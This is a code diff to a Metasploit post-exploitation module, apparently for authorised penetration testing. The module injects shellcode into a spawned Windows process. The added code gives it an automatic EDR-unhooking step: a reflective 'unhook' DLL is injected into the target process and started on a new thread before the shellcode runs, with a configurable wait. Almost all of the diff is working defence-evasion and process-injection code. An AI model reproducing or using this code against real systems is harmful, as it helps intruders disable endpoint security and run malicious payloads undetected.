@@ -29,6 +29,8 @@ class MetasploitModule < Msf::Post
         OptBool.new('CHANNELIZED', [true, 'Retrieve output of the process', true]),
         OptBool.new('INTERACTIVE', [true, 'Interact with the process', true]),
         OptBool.new('HIDDEN', [true, 'Spawn an hidden process', true]),
+        OptBool.new('AUTOUNHOOK', [true, 'Auto remove EDRs hooks', true]),
+        OptInt.new('WAIT_UNHOOK', [true, 'Seconds to wait for unhook to be executed', 5]),
         OptEnum.new('BITS', [true, 'Set architecture bits', '64', ['32', '64']])
       ])
   end
@@ -63,6 +65,10 @@ class MetasploitModule < Msf::Post
       print_error("Migrate to an x64 process and try again.")
       return false
     elsif arch_check(bits, p.pid)
+      if datastore['AUTOUNHOOK']
+        inject_unhook(p, bits)
+      end
+
       inject(shellcode, p)
     end
   end
@@ -108,6 +114,26 @@ class MetasploitModule < Msf::Post
     })
 
     return proc
+  end
+
+  def inject_unhook(p, bits)
+    if bits == ARCH_X64
+      dll_file_name = 'x64.dll'
+      vprint_status("Assigning payload ext_server_unhook.x64.dll")
+    elsif bits == ARCH_X86
+      dll_file_name = 'x86.dll'
+      vprint_status("Assigning payload ext_server_unhook.x86.dll")
+    else
+      fail_with(Failure::BadConfig, "Unknown target arch; unable to assign unhook dll")
+    end
+
+    dll_file = MetasploitPayloads.meterpreter_ext_path('unhook', dll_file_name)
+    print_status("Injecting unhook Reflective DLL into process ID #{p.pid}")
+    dll, offset = inject_dll_into_process(p, dll_file)
+    print_status("Executing unhook")
+    p.thread.create(dll + offset, 0)
+    print_status("Waiting #{datastore['WAIT_UNHOOK']} seconds for unhook Reflective DLL to be executed...")
+    Rex.sleep(datastore['WAIT_UNHOOK'])
   end
 
   def inject(shellcode, p)
